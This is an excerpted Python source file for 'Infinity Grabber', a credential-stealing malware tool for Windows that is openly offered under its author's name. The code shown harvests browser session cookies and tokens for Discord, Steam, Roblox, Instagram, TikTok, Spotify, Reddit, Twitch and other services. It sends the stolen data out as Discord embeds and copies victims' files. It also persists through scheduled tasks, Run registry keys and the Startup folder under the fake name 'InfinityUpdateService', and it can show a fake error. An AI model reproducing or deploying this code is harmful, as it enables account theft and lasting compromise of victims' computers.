# Infinity Grabber All Rights Recieved
# Coded by Kayasin52
...
class Main:
            ...
            if os.path.isdir(ubisoft_path):
                ...
                if found_ubisoft == True:
                    ...
                    with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("https://discord.gg/client\n==============================================\n")
    ...
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    "title": "***Infinity Grabber***",
                    "description": f"***Infinity Riot Games Session was detected on the {browser} browser***",
                    "url" : "https://discord.gg/client",
                    "color": 0,
                    "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
                    "thumbnail": {"url": "https://media.discordapp.net/attachments/1175802512243167242/1196895294172962868/866858bc3f68d2bb0739b2ef598d9f2d.png?ex=65f9e41b&is=65e76f1b&hm=acd36375a9f3a6165393886ac50d815075d38448515e658c5c140a45fe2978a2&"}}
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Infinity Grabber***",
                "description": f"***Infinity Instagram Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/client",
                "color": 0,
                "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
                "thumbnail": {"url": pp}}
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Infinity Grabber***",
                "description": f"***Infinity Tiktok Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/client",
                "color": 0,
                "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
                "thumbnail": {"url": "https://media.discordapp.net/attachments/1175802512243167242/1196895294172962868/866858bc3f68d2bb0739b2ef598d9f2d.png?ex=65f9e41b&is=65e76f1b&hm=acd36375a9f3a6165393886ac50d815075d38448515e658c5c140a45fe2978a2&"}}
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Infinity Grabber***",
                "description": f"***Infinity Twitter Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/client",
                "color": 0,
                "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
                "thumbnail": {"url": pp}}
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            lang = data["language"]
            pp = 'https://media.discordapp.net/attachments/1175802512243167242/1196895294172962868/866858bc3f68d2bb0739b2ef598d9f2d.png?ex=65f9e41b&is=65e76f1b&hm=acd36375a9f3a6165393886ac50d815075d38448515e658c5c140a45fe2978a2&'
            try:
            ...
            embed_data = {
                "title": "***Infinity Grabber***",
                "description": f"***Infinity Twitch Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/client",
                "color": 0,
                "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
                "thumbnail": {"url": pp}}
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Infinity Grabber***",
                "description": f"***Infinity Spotify Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/client",
                "color": 0,
                "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
                "thumbnail": {"url": "https://media.discordapp.net/attachments/1175802512243167242/1196895294172962868/866858bc3f68d2bb0739b2ef598d9f2d.png?ex=65f9e41b&is=65e76f1b&hm=acd36375a9f3a6165393886ac50d815075d38448515e658c5c140a45fe2978a2&"}}
    ...
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Infinity Grabber***",
                "description": f"***Infinity Reddit Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/client",
                "color": 0,
                "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
                "thumbnail": {"url": pp}}
    ...
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                embed_data = {
                    "title": "***Infinity Grabber***",
                    "description": f"***Infinity Roblox Session was detected on the {browser} browser***",
                    "url" : "https://discord.gg/client",
                    "color": 0,
                    "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
                    "thumbnail": {"url": pp}}
    ...
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            ...
            if data:
                embed_data = {
                "title": "***Infinity Grabber***",
                "description": f"***Infinity Validated Discord Token Detected***",
                "url" : "https://discord.gg/client",
                "color": 0,
                "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
                "thumbnail": {"url": ""}}
                    ...
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                ...
                                embed_data = {
                                    "title": "***Infinity Grabber***",
                                    "description": f"***Infinity Steam Session Detected***",
                                    "url" : "https://discord.gg/client",
                                    "color": 0,
                                    "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
    ...
    async def SendAllData(self) -> None:
        ...
        embed_data = {
            "title": "***Infinity Grabber***",
            "description": f"***Infinity Grabber Full Info***",
            "url" : "https://discord.gg/client",
            "color": 0,
            "footer": {"text": "https://discord.gg/client | https://github.com/InfinityYoutube"},
            "thumbnail": {"url": "https://media.discordapp.net/attachments/1175802512243167242/1196895294172962868/866858bc3f68d2bb0739b2ef598d9f2d.png?ex=65f9e41b&is=65e76f1b&hm=acd36375a9f3a6165393886ac50d815075d38448515e658c5c140a45fe2978a2&"}}
...
class StealCommonFiles:
    ...
    async def StealFiles(self) -> None:
        try:
            ...
            destination_directory = os.path.join(self.temp, "StealedFilesByInfinity")
...
class Startup:
    def __init__(self) -> None:
        ...
        self.ToPath:str = os.path.join(self.LocalAppData, "InfinityUpdateService", "Infinity.exe")
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                ...
                os.mkdir(self.ToPath.replace("Infinity.exe", "")) # Create Directory
    ...
    async def SchtaskStartup(self) -> None: # schtask method for startup
        try:
            command = await asyncio.create_subprocess_shell(
                'schtasks /query /TN "InfinityUpdateService"',
                shell=True,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE)
            ...
            if not stdout: # if the file not on schtasks
                if self.Privalage: # if the code running on admin privilage, execute the startup command
                    try:
                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "InfinityUpdateService" /tr "{self.ToPath}"'
                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "InfinityUpdateService2" /tr "{self.ToPath}"'
                    ...
                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
                        ...
                        try:
                            command = f'schtasks /create /f /sc daily /ri 30 /tn "InfinityUpdateService" /tr "{self.ToPath}"'
                            ...
                            process = await asyncio.create_subprocess_shell(
                            f'schtasks /create /f /tn "InfinityUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            shell=True)
                            await process.communicate()
    ...
    async def RegeditStartup(self) -> None: # regedit method for startup
        try:
            if not self.Privalage: # if the code not running admin privilage, copy to HKCU
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Infinity Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
                ...
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Infinity Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
    ...
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Infinity.exe"):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Infinity.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Infinity.exe")):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Infinity.exe"))
        except Exception as e:
            print(str(e))
...
async def Fakerror() -> None:
    try:
        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "InfinityUpdateService", "Infinity.exe"):
...
if __name__ == '__main__':
    if os.name == "nt":
        if not SubModules.create_mutex("Infinity Grabber"):
        ...
        print("just Windows Operating system's supported by Infinity")
